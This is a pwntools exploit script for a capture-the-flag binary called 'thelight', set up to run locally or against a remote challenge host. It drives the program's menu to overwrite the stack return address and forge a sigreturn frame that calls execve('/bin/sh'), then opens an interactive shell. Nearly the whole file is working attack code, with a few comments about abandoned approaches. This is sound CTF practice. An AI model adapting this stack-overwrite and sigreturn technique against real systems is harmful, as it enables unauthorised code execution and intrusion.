#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("thelight")
# b *listPanels+177
gs = '''
b *listPanels+397
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 24481)
    else:
        return process(elf.path)

# Plan:
# Write 4 y's to get to listPanel()
# Write 1 to make r8=0x1
# Write 5, 80 times to get to retn addr on stack
# 0x68732f6e69622f -> /bin/sh

# Addresses
push_rbp = 0x40141b

# Functions
def inc_index(amount):
    for i in range(amount):
        io.sendlineafter(b">  ",b"5")
    

def get_to_listPanel():
    for i in range(4):
        io.recvuntil(b"Flip the light switch? (y/n)")
        io.sendline(b"y")


def write_1b():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"2") # set r8=27 = 0x1b
    inc_index(1)

def write_14():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20 = 0x14
    inc_index(1)

def write_40():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"2") # set r8=62
    io.sendlineafter(b">  ", b"2") # set r8=64 = 0x40
    inc_index(1)

def write_2f():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"2") # set r8=47 = 0x2f
    inc_index(1)


def write_62():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"2") # set r8=97
    io.sendlineafter(b">  ", b"1") # set r8=98
    inc_index(1)

def write_69():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"3") # set r8=100
    io.sendlineafter(b">  ", b"3") # set r8=105 = 0x69
    inc_index(1)

def write_6e():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"3") # set r8=100
    io.sendlineafter(b">  ", b"3") # set r8=105
    io.sendlineafter(b">  ", b"3") # set r8=110 = 0x6e
    inc_index(1)

def write_73():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"3") # set r8=100
    io.sendlineafter(b">  ", b"3") # set r8=105
    io.sendlineafter(b">  ", b"3") # set r8=110
    io.sendlineafter(b">  ", b"3") # set r8=115 = 0x73
    inc_index(1)

def write_c0():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"3") # set r8=100
    io.sendlineafter(b">  ", b"3") # set r8=105
    io.sendlineafter(b">  ", b"3") # set r8=110
    io.sendlineafter(b">  ", b"3") # set r8=115
    io.sendlineafter(b">  ", b"3") # set r8=120
    io.sendlineafter(b">  ", b"3") # set r8=125
    io.sendlineafter(b">  ", b"3") # set r8=130
    io.sendlineafter(b">  ", b"3") # set r8=135
    io.sendlineafter(b">  ", b"3") # set r8=140
    io.sendlineafter(b">  ", b"3") # set r8=145
    io.sendlineafter(b">  ", b"3") # set r8=150
    io.sendlineafter(b">  ", b"3") # set r8=155
    io.sendlineafter(b">  ", b"3") # set r8=160
    io.sendlineafter(b">  ", b"3") # set r8=165
    io.sendlineafter(b">  ", b"3") # set r8=170
    io.sendlineafter(b">  ", b"3") # set r8=175
    io.sendlineafter(b">  ", b"3") # set r8=180
    io.sendlineafter(b">  ", b"3") # set r8=185
    io.sendlineafter(b">  ", b"3") # set r8=190
    io.sendlineafter(b">  ", b"2") # set r8=192 = 0xc0
    inc_index(1)

def write_10():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"1") # set r8=16 = 0x10
    inc_index(1)

def write_68():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"3") # set r8=90
    io.sendlineafter(b">  ", b"3") # set r8=95
    io.sendlineafter(b">  ", b"3") # set r8=100
    io.sendlineafter(b">  ", b"2") # set r8=102
    io.sendlineafter(b">  ", b"2") # set r8=104 = 0x68
    inc_index(1)

def write_3b():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"2") # set r8=57
    io.sendlineafter(b">  ", b"2") # set r8=59 = 0x3b
    inc_index(1)


def write_58():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"3") # set r8=60
    io.sendlineafter(b">  ", b"3") # set r8=65
    io.sendlineafter(b">  ", b"3") # set r8=70
    io.sendlineafter(b">  ", b"3") # set r8=75
    io.sendlineafter(b">  ", b"3") # set r8=80
    io.sendlineafter(b">  ", b"3") # set r8=85
    io.sendlineafter(b">  ", b"2") # set r8=87
    io.sendlineafter(b">  ", b"1") # set r8=88
    inc_index(1)

def write_26():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"2") # set r8=37
    io.sendlineafter(b">  ", b"1") # set r8=38
    inc_index(1)

def write_1f():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"1") # set r8=31 = 0x1f
    inc_index(1)

def write_33():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"1") # set r8=51 = 0x33
    inc_index(1)

def write_36():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"2") # set r8=52
    io.sendlineafter(b">  ", b"2") # set r8=54
    inc_index(1)

def write_1():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"1") # set r8=1 = 0x1
    inc_index(1)

def write_38():
    io.sendlineafter(b">  ", b"6") # set r8=0
    io.sendlineafter(b">  ", b"3") # set r8=5
    io.sendlineafter(b">  ", b"3") # set r8=10
    io.sendlineafter(b">  ", b"3") # set r8=15
    io.sendlineafter(b">  ", b"3") # set r8=20
    io.sendlineafter(b">  ", b"3") # set r8=25
    io.sendlineafter(b">  ", b"3") # set r8=30
    io.sendlineafter(b">  ", b"3") # set r8=35
    io.sendlineafter(b">  ", b"3") # set r8=40
    io.sendlineafter(b">  ", b"3") # set r8=45
    io.sendlineafter(b">  ", b"3") # set r8=50
    io.sendlineafter(b">  ", b"3") # set r8=55
    io.sendlineafter(b">  ", b"1") # set r8=56 = 0x38
    inc_index(1)

def write_0():
    io.sendlineafter(b">  ", b"6") # set r8=0
    inc_index(1)

    


io = start()

get_to_listPanel()

io.sendlineafter(b">  ", b"1") # must have at least one or localvar10 == 0 which will return

inc_index(80) # move to ret addr
# Overwrite the ret addr with 0x40141b (pop rax gadget) - debunked for now
# 0x40141f lets try mov rax, 0xf directly
write_1f()
write_14()
write_40()
write_0()
write_0()
write_0()
write_0()
write_0() # ret addr done

# write 12 addresses full of 0's
# 13 * 8 = 104
inc_index(104) # remember we just set r8 = 0 so we can just increment

# write binsh 0x68732f6e69622f -> /bin/sh : 7 bytes, can fit in 1 addr -- not working has to be pointer to the string and not the string itself
# 0x68 73 2f 6e 69 62 2f
#write_2f()
#write_62()
#write_69()
#write_6e()
#write_2f()
#write_73()
#write_68()
#write_0() # binsh finished

# found /bin/sh using gdb search "/bin/sh"
# 0x404058
write_58()
write_40()
write_40()
write_0()
write_0()
write_0()
write_0()
write_0() # end of binsh

# write 4 addresses full of 0's
# 4 * 8 = 32
io.sendlineafter(b">  ", b"6") # set r8 = 0
inc_index(32)
write_3b() # write 0x3b = 59 to rax. This is the execve syscall number
write_0()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0() # end of rax


# write 2 addresses full of 0's
# 2 * 8 = 16
io.sendlineafter(b">  ", b"6") # set r8 = 0
inc_index(16)

# Next we need to write sycall addr to rip
# syscall at addr: 0x401426 - debunked for now
# try the 2nd syscall insteal: 0x401436

write_36()
write_14()
write_40()
write_0()
write_0()
write_0()
write_0()
write_0() # end of rip, now pointing to syscall

# put 1 addr of 0's after syscall, this is the eflags field
io.sendlineafter(b">  ", b"6") # set r8 = 0
inc_index(8)

# set cs / gs / fs  to 0x3 - I don't know why
write_33()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0() # end of flags

# set err
# here we will write _start: 0x4010c0
write_c0()
write_10()
write_40()
write_0()
write_0()
write_0()
write_0()
write_0() # end of err

# trapno, set to 0x1
write_1()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0() # end of trapno

# next 3 addr should be filled with 0's: oldmask(unused), cr2(segfault addr), &fpstate
io.sendlineafter(b">  ", b"6") # set r8 = 0
inc_index(24)

# __reserved set to _start
write_c0()
write_10()
write_40()
write_0()
write_0()
write_0()
write_0()
write_0() # end of __reserved

# sigmask set to 0x8 - this is the last addr
write_38()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0()
write_0() # end of sigmask



io.sendlineafter(b">  ", b"7") 

io.interactive()
